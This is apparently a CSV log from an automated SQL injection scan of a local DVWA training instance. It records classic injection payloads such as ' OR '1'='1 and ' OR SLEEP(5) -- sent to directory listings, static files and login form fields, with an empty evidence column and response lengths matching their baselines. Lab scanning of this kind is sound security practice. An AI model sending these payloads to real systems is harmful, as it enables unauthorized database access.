page_url,param_tested,method,payload,status,elapsed,length,evidence,baseline_length,baseline_elapsed
http://127.0.0.1/dvwa/,id,GET,' OR '1'='1,200,0.013369,1500,,1500,0.008072
http://127.0.0.1/dvwa/,id,GET,' OR '1'='1' -- ,200,0.007377,1500,,1500,0.008072
http://127.0.0.1/dvwa/,id,GET,' OR 1=1--,200,0.004541,1500,,1500,0.008072
http://127.0.0.1/dvwa/,id,GET,""" OR """" = """,200,0.006881,1500,,1500,0.008072
http://127.0.0.1/dvwa/,id,GET,' OR SLEEP(5) --,200,0.008597,1500,,1500,0.008072
http://127.0.0.1/dvwa/,id,GET,1' OR '1'='1,200,0.004559,1500,,1500,0.008072
http://127.0.0.1/dvwa/?C=D;O=A,id,GET,' OR '1'='1,200,0.004594,1500,,1500,0.005148
http://127.0.0.1/dvwa/?C=D;O=A,id,GET,' OR '1'='1' -- ,200,0.006269,1500,,1500,0.005148
http://127.0.0.1/dvwa/?C=D;O=A,id,GET,' OR 1=1--,200,0.005449,1500,,1500,0.005148
http://127.0.0.1/dvwa/?C=D;O=A,id,GET,""" OR """" = """,200,0.005981,1500,,1500,0.005148
http://127.0.0.1/dvwa/?C=D;O=A,id,GET,' OR SLEEP(5) --,200,0.005049,1500,,1500,0.005148
http://127.0.0.1/dvwa/?C=D;O=A,id,GET,1' OR '1'='1,200,0.004177,1500,,1500,0.005148
http://127.0.0.1/dvwa/?C=S;O=A,id,GET,' OR '1'='1,200,0.005266,1500,,1500,0.006078
http://127.0.0.1/dvwa/?C=S;O=A,id,GET,' OR '1'='1' -- ,200,0.004865,1500,,1500,0.006078
http://127.0.0.1/dvwa/?C=S;O=A,id,GET,' OR 1=1--,200,0.005172,1500,,1500,0.006078
http://127.0.0.1/dvwa/?C=S;O=A,id,GET,""" OR """" = """,200,0.004794,1500,,1500,0.006078
http://127.0.0.1/dvwa/?C=S;O=A,id,GET,' OR SLEEP(5) --,200,0.004833,1500,,1500,0.006078
http://127.0.0.1/dvwa/?C=S;O=A,id,GET,1' OR '1'='1,200,0.005737,1500,,1500,0.006078
http://127.0.0.1/dvwa/js/,id,GET,' OR '1'='1,200,0.004267,1173,,1173,0.004103
http://127.0.0.1/dvwa/js/,id,GET,' OR '1'='1' -- ,200,0.006063,1173,,1173,0.004103
http://127.0.0.1/dvwa/js/,id,GET,' OR 1=1--,200,0.004142,1173,,1173,0.004103
http://127.0.0.1/dvwa/js/,id,GET,""" OR """" = """,200,0.004081,1173,,1173,0.004103
http://127.0.0.1/dvwa/js/,id,GET,' OR SLEEP(5) --,200,0.003331,1173,,1173,0.004103
http://127.0.0.1/dvwa/js/,id,GET,1' OR '1'='1,200,0.004529,1173,,1173,0.004103
http://127.0.0.1/dvwa/css/,id,GET,' OR '1'='1,200,0.004203,1529,,1529,0.003646
http://127.0.0.1/dvwa/css/,id,GET,' OR '1'='1' -- ,200,0.003481,1529,,1529,0.003646
http://127.0.0.1/dvwa/css/,id,GET,' OR 1=1--,200,0.004529,1529,,1529,0.003646
http://127.0.0.1/dvwa/css/,id,GET,""" OR """" = """,200,0.003977,1529,,1529,0.003646
http://127.0.0.1/dvwa/css/,id,GET,' OR SLEEP(5) --,200,0.003466,1529,,1529,0.003646
http://127.0.0.1/dvwa/css/,id,GET,1' OR '1'='1,200,0.004987,1529,,1529,0.003646
http://127.0.0.1/dvwa/includes/,id,GET,' OR '1'='1,200,0.00459,1377,,1377,0.004171
http://127.0.0.1/dvwa/includes/,id,GET,' OR '1'='1' -- ,200,0.004905,1377,,1377,0.004171
http://127.0.0.1/dvwa/includes/,id,GET,' OR 1=1--,200,0.003375,1377,,1377,0.004171
http://127.0.0.1/dvwa/includes/,id,GET,""" OR """" = """,200,0.005281,1377,,1377,0.004171
http://127.0.0.1/dvwa/includes/,id,GET,' OR SLEEP(5) --,200,0.004975,1377,,1377,0.004171
http://127.0.0.1/dvwa/includes/,id,GET,1' OR '1'='1,200,0.002955,1377,,1377,0.004171
http://127.0.0.1/login.php,username,POST,' OR '1'='1,200,0.013585,1573,,1573,0.008417
http://127.0.0.1/login.php,password,POST,' OR '1'='1,200,0.011338,1573,,1573,0.008417
http://127.0.0.1/login.php,Login,POST,' OR '1'='1,200,0.006915,1573,,1573,0.008417
http://127.0.0.1/login.php,user_token,POST,' OR '1'='1,200,0.006557,1573,,1573,0.008417
http://127.0.0.1/login.php,username,POST,' OR '1'='1' -- ,200,0.008516,1573,,1573,0.008417
http://127.0.0.1/login.php,password,POST,' OR '1'='1' -- ,200,0.008483,1573,,1573,0.008417
http://127.0.0.1/login.php,Login,POST,' OR '1'='1' -- ,200,0.013134,1573,,1573,0.008417
http://127.0.0.1/login.php,user_token,POST,' OR '1'='1' -- ,200,0.0087,1573,,1573,0.008417
http://127.0.0.1/login.php,username,POST,' OR 1=1--,200,0.010942,1573,,1573,0.008417
http://127.0.0.1/login.php,password,POST,' OR 1=1--,200,0.011095,1573,,1573,0.008417
http://127.0.0.1/login.php,Login,POST,' OR 1=1--,200,0.010054,1573,,1573,0.008417
http://127.0.0.1/login.php,user_token,POST,' OR 1=1--,200,0.009087,1573,,1573,0.008417
http://127.0.0.1/login.php,username,POST,""" OR """" = """,200,0.008002,1573,,1573,0.008417
http://127.0.0.1/login.php,password,POST,""" OR """" = """,200,0.01255,1573,,1573,0.008417
http://127.0.0.1/login.php,Login,POST,""" OR """" = """,200,0.011171,1573,,1573,0.008417
http://127.0.0.1/login.php,user_token,POST,""" OR """" = """,200,0.00987,1573,,1573,0.008417
http://127.0.0.1/login.php,username,POST,' OR SLEEP(5) --,200,0.009693,1573,,1573,0.008417
http://127.0.0.1/login.php,password,POST,' OR SLEEP(5) --,200,0.009959,1573,,1573,0.008417
http://127.0.0.1/login.php,Login,POST,' OR SLEEP(5) --,200,0.009179,1573,,1573,0.008417
http://127.0.0.1/login.php,user_token,POST,' OR SLEEP(5) --,200,0.008699,1573,,1573,0.008417
http://127.0.0.1/login.php,username,POST,1' OR '1'='1,200,0.010872,1573,,1573,0.008417
http://127.0.0.1/login.php,password,POST,1' OR '1'='1,200,0.008465,1573,,1573,0.008417
http://127.0.0.1/login.php,Login,POST,1' OR '1'='1,200,0.009955,1573,,1573,0.008417
http://127.0.0.1/login.php,user_token,POST,1' OR '1'='1,200,0.009807,1573,,1573,0.008417
http://127.0.0.1/dvwa/?C=N;O=D,id,GET,' OR '1'='1,200,0.004768,1500,,1500,0.005433
http://127.0.0.1/dvwa/?C=N;O=D,id,GET,' OR '1'='1' -- ,200,0.00665,1500,,1500,0.005433
http://127.0.0.1/dvwa/?C=N;O=D,id,GET,' OR 1=1--,200,0.00635,1500,,1500,0.005433
http://127.0.0.1/dvwa/?C=N;O=D,id,GET,""" OR """" = """,200,0.005034,1500,,1500,0.005433
http://127.0.0.1/dvwa/?C=N;O=D,id,GET,' OR SLEEP(5) --,200,0.004028,1500,,1500,0.005433
http://127.0.0.1/dvwa/?C=N;O=D,id,GET,1' OR '1'='1,200,0.004425,1500,,1500,0.005433
http://127.0.0.1/dvwa/images/,id,GET,' OR '1'='1,200,0.004785,2167,,2167,0.004921
http://127.0.0.1/dvwa/images/,id,GET,' OR '1'='1' -- ,200,0.02254,2167,,2167,0.004921
http://127.0.0.1/dvwa/images/,id,GET,' OR 1=1--,200,0.004684,2167,,2167,0.004921
http://127.0.0.1/dvwa/images/,id,GET,""" OR """" = """,200,0.004231,2167,,2167,0.004921
http://127.0.0.1/dvwa/images/,id,GET,' OR SLEEP(5) --,200,0.004474,2167,,2167,0.004921
http://127.0.0.1/dvwa/images/,id,GET,1' OR '1'='1,200,0.006084,2167,,2167,0.004921
http://127.0.0.1/dvwa/?C=M;O=A,id,GET,' OR '1'='1,200,0.004994,1500,,1500,0.004506
http://127.0.0.1/dvwa/?C=M;O=A,id,GET,' OR '1'='1' -- ,200,0.005446,1500,,1500,0.004506
http://127.0.0.1/dvwa/?C=M;O=A,id,GET,' OR 1=1--,200,0.005644,1500,,1500,0.004506
http://127.0.0.1/dvwa/?C=M;O=A,id,GET,""" OR """" = """,200,0.004681,1500,,1500,0.004506
http://127.0.0.1/dvwa/?C=M;O=A,id,GET,' OR SLEEP(5) --,200,0.005072,1500,,1500,0.004506
http://127.0.0.1/dvwa/?C=M;O=A,id,GET,1' OR '1'='1,200,0.004692,1500,,1500,0.004506
http://127.0.0.1/dvwa/?C=D;O=D,id,GET,' OR '1'='1,200,0.004026,1500,,1500,0.004263
http://127.0.0.1/dvwa/?C=D;O=D,id,GET,' OR '1'='1' -- ,200,0.003757,1500,,1500,0.004263
http://127.0.0.1/dvwa/?C=D;O=D,id,GET,' OR 1=1--,200,0.004511,1500,,1500,0.004263
http://127.0.0.1/dvwa/?C=D;O=D,id,GET,""" OR """" = """,200,0.004576,1500,,1500,0.004263
http://127.0.0.1/dvwa/?C=D;O=D,id,GET,' OR SLEEP(5) --,200,0.006964,1500,,1500,0.004263
http://127.0.0.1/dvwa/?C=D;O=D,id,GET,1' OR '1'='1,200,0.005562,1500,,1500,0.004263
http://127.0.0.1/dvwa/?C=N;O=A,id,GET,' OR '1'='1,200,0.005498,1500,,1500,0.011573
http://127.0.0.1/dvwa/?C=N;O=A,id,GET,' OR '1'='1' -- ,200,0.006642,1500,,1500,0.011573
http://127.0.0.1/dvwa/?C=N;O=A,id,GET,' OR 1=1--,200,0.007303,1500,,1500,0.011573
http://127.0.0.1/dvwa/?C=N;O=A,id,GET,""" OR """" = """,200,0.004262,1500,,1500,0.011573
http://127.0.0.1/dvwa/?C=N;O=A,id,GET,' OR SLEEP(5) --,200,0.005677,1500,,1500,0.011573
http://127.0.0.1/dvwa/?C=N;O=A,id,GET,1' OR '1'='1,200,0.005489,1500,,1500,0.011573
http://127.0.0.1/dvwa/?C=S;O=D,id,GET,' OR '1'='1,200,0.003854,1500,,1500,0.004329
http://127.0.0.1/dvwa/?C=S;O=D,id,GET,' OR '1'='1' -- ,200,0.004707,1500,,1500,0.004329
http://127.0.0.1/dvwa/?C=S;O=D,id,GET,' OR 1=1--,200,0.003706,1500,,1500,0.004329
http://127.0.0.1/dvwa/?C=S;O=D,id,GET,""" OR """" = """,200,0.007737,1500,,1500,0.004329
http://127.0.0.1/dvwa/?C=S;O=D,id,GET,' OR SLEEP(5) --,200,0.005289,1500,,1500,0.004329
http://127.0.0.1/dvwa/?C=S;O=D,id,GET,1' OR '1'='1,200,0.006218,1500,,1500,0.004329
http://127.0.0.1/dvwa/js/?C=S;O=A,id,GET,' OR '1'='1,200,0.005609,1173,,1173,0.005349
http://127.0.0.1/dvwa/js/?C=S;O=A,id,GET,' OR '1'='1' -- ,200,0.004569,1173,,1173,0.005349
http://127.0.0.1/dvwa/js/?C=S;O=A,id,GET,' OR 1=1--,200,0.005759,1173,,1173,0.005349
http://127.0.0.1/dvwa/js/?C=S;O=A,id,GET,""" OR """" = """,200,0.004989,1173,,1173,0.005349
http://127.0.0.1/dvwa/js/?C=S;O=A,id,GET,' OR SLEEP(5) --,200,0.006487,1173,,1173,0.005349
http://127.0.0.1/dvwa/js/?C=S;O=A,id,GET,1' OR '1'='1,200,0.004737,1173,,1173,0.005349
http://127.0.0.1/dvwa/js/add_event_listeners.js,id,GET,' OR '1'='1,200,0.004703,593,,593,0.004634
http://127.0.0.1/dvwa/js/add_event_listeners.js,id,GET,' OR '1'='1' -- ,200,0.003826,593,,593,0.004634
http://127.0.0.1/dvwa/js/add_event_listeners.js,id,GET,' OR 1=1--,200,0.003528,593,,593,0.004634
http://127.0.0.1/dvwa/js/add_event_listeners.js,id,GET,""" OR """" = """,200,0.00339,593,,593,0.004634
http://127.0.0.1/dvwa/js/add_event_listeners.js,id,GET,' OR SLEEP(5) --,200,0.004443,593,,593,0.004634
http://127.0.0.1/dvwa/js/add_event_listeners.js,id,GET,1' OR '1'='1,200,0.003107,593,,593,0.004634
http://127.0.0.1/dvwa/js/?C=D;O=A,id,GET,' OR '1'='1,200,0.004422,1173,,1173,0.005624
http://127.0.0.1/dvwa/js/?C=D;O=A,id,GET,' OR '1'='1' -- ,200,0.003598,1173,,1173,0.005624
http://127.0.0.1/dvwa/js/?C=D;O=A,id,GET,' OR 1=1--,200,0.004376,1173,,1173,0.005624
http://127.0.0.1/dvwa/js/?C=D;O=A,id,GET,""" OR """" = """,200,0.004527,1173,,1173,0.005624
http://127.0.0.1/dvwa/js/?C=D;O=A,id,GET,' OR SLEEP(5) --,200,0.003343,1173,,1173,0.005624
http://127.0.0.1/dvwa/js/?C=D;O=A,id,GET,1' OR '1'='1,200,0.003248,1173,,1173,0.005624
http://127.0.0.1/dvwa/js/?C=M;O=A,id,GET,' OR '1'='1,200,0.004022,1173,,1173,0.004471
http://127.0.0.1/dvwa/js/?C=M;O=A,id,GET,' OR '1'='1' -- ,200,0.004655,1173,,1173,0.004471
http://127.0.0.1/dvwa/js/?C=M;O=A,id,GET,' OR 1=1--,200,0.004683,1173,,1173,0.004471
http://127.0.0.1/dvwa/js/?C=M;O=A,id,GET,""" OR """" = """,200,0.004491,1173,,1173,0.004471
http://127.0.0.1/dvwa/js/?C=M;O=A,id,GET,' OR SLEEP(5) --,200,0.003675,1173,,1173,0.004471
http://127.0.0.1/dvwa/js/?C=M;O=A,id,GET,1' OR '1'='1,200,0.005036,1173,,1173,0.004471
http://127.0.0.1/dvwa/js/?C=N;O=D,id,GET,' OR '1'='1,200,0.005272,1173,,1173,0.004567
http://127.0.0.1/dvwa/js/?C=N;O=D,id,GET,' OR '1'='1' -- ,200,0.004887,1173,,1173,0.004567
http://127.0.0.1/dvwa/js/?C=N;O=D,id,GET,' OR 1=1--,200,0.00387,1173,,1173,0.004567
http://127.0.0.1/dvwa/js/?C=N;O=D,id,GET,""" OR """" = """,200,0.005355,1173,,1173,0.004567
http://127.0.0.1/dvwa/js/?C=N;O=D,id,GET,' OR SLEEP(5) --,200,0.004629,1173,,1173,0.004567
http://127.0.0.1/dvwa/js/?C=N;O=D,id,GET,1' OR '1'='1,200,0.003537,1173,,1173,0.004567
http://127.0.0.1/dvwa/js/dvwaPage.js,id,GET,' OR '1'='1,200,0.002602,1030,,1030,0.003631
http://127.0.0.1/dvwa/js/dvwaPage.js,id,GET,' OR '1'='1' -- ,200,0.003874,1030,,1030,0.003631
http://127.0.0.1/dvwa/js/dvwaPage.js,id,GET,' OR 1=1--,200,0.003711,1030,,1030,0.003631
http://127.0.0.1/dvwa/js/dvwaPage.js,id,GET,""" OR """" = """,200,0.003652,1030,,1030,0.003631
http://127.0.0.1/dvwa/js/dvwaPage.js,id,GET,' OR SLEEP(5) --,200,0.004753,1030,,1030,0.003631
http://127.0.0.1/dvwa/js/dvwaPage.js,id,GET,1' OR '1'='1,200,0.004408,1030,,1030,0.003631
http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,' OR '1'='1,200,0.004334,1529,,1529,0.004484
http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,' OR '1'='1' -- ,200,0.003959,1529,,1529,0.004484
http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,' OR 1=1--,200,0.004218,1529,,1529,0.004484
http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,""" OR """" = """,200,0.004891,1529,,1529,0.004484
http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,' OR SLEEP(5) --,200,0.005197,1529,,1529,0.004484
http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,1' OR '1'='1,200,0.004477,1529,,1529,0.004484
http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,' OR '1'='1,200,0.006545,1529,,1529,0.004237
http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,' OR '1'='1' -- ,200,0.004506,1529,,1529,0.004237
http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,' OR 1=1--,200,0.003533,1529,,1529,0.004237
http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,""" OR """" = """,200,0.004584,1529,,1529,0.004237
http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,' OR SLEEP(5) --,200,0.00523,1529,,1529,0.004237
http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,1' OR '1'='1,200,0.004445,1529,,1529,0.004237
http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,' OR '1'='1,200,0.004237,1529,,1529,0.004637
http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,' OR '1'='1' -- ,200,0.006259,1529,,1529,0.004637
http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,' OR 1=1--,200,0.004851,1529,,1529,0.004637
http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,""" OR """" = """,200,0.005138,1529,,1529,0.004637
http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,' OR SLEEP(5) --,200,0.003489,1529,,1529,0.004637
http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,1' OR '1'='1,200,0.004721,1529,,1529,0.004637
http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,' OR '1'='1,200,0.004046,1529,,1529,0.004025
